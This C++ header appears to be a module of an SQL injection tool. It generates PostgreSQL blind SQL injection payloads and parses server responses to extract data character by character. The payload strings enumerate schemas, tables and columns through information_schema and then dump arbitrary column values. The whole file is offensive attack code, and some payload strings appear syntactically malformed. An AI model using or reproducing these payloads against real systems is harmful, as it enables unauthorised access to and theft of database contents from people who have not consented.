#ifndef POSTGRESQL_BLIND_BASED
#define POSTGRESQL_BLIND_BASED

#define BLIND_BASED_RECORD 0
#define BLIND_BASED_INDEX 1
#define BLIND_BASED_CMP_START 2
#define BLIND_BASED_CMP 3
#define BLIND_BASED_BUFFER 4
#define BLIND_BASED_MARKED 5
#define BLIND_BASED_DATABASE 6
#define BLIND_BASED_TABLE 7
#define BLIND_BASED_COLUMN 8

#include "../../Vaccine.hpp"

struct postgresql_blind_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                const int cmp = (*config[BLIND_BASED_CMP])[0];
                switch (type)
                {
                case DATABASES:
                        return "' OR ASCII(SUBSTRING(("
                               "SELECT schema_name "
                               "FROM information_schema.schemata "
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               std::to_string(cmp) + "', 1, 0)-- ";
                case TABLES:
                        return "' OR ASCII(SUBSTRING(("
                               "SELECT table_name "
                               "FROM information_schema.tables "
                               "WHERE table_schema='" +
                               *config[BLIND_BASED_DATABASE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               std::to_string(cmp) + "', 1, 0)-- ";
                case COLUMNS:
                        return "' OR ASCII(SUBSTRING(("
                               "SELECT column_name "
                               "FROM information_schema.columns "
                               "WHERE table_schema='" +
                               *config[BLIND_BASED_DATABASE] + "' " +
                               "AND table_name='" +
                               *config[BLIND_BASED_TABLE] + "' " +
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               std::to_string(cmp) + "', 1, 0)-- ";
                case VALUES:
                        return "' OR ASCII(SUBSTRING(( SELECT " +
                               *config[BLIND_BASED_COLUMN] + "::text " +
                               "FROM " + *config[BLIND_BASED_DATABASE] + "." +
                               *config[BLIND_BASED_TABLE] + " " +
                               "LIMIT 1 OFFSET " +
                               *config[BLIND_BASED_INDEX] + "), " +
                               *config[BLIND_BASED_CMP_START] + ", 1)='" +
                               std::to_string(cmp) + "', 1, 0)-- ";
                default:
                        return std::string();
                }
        };

        static str_vector parser(const std::string& response, sptr_vector& config)
        {
                str_vector values;
                if (response != *config[BLIND_BASED_RECORD])
                {
                        values.push_back(*config[BLIND_BASED_CMP]);
                        *config[BLIND_BASED_CMP] = "!";
                        const int index = std::stoi(*config[BLIND_BASED_CMP_START]);
                        *config[BLIND_BASED_CMP_START] = std::to_string(index + 1);
                }
                else
                {
                        (*config[BLIND_BASED_CMP])[0] += 1;
                        switch ((*config[BLIND_BASED_CMP])[0])
                        {
                        case 96:
                        case '\'':
                        case '\"':
                        case '\\':
                                (*config[BLIND_BASED_CMP])[0] += 1;
                                break;
                        default:
                                break;
                        }
                }
                return values;
        };
};
#endif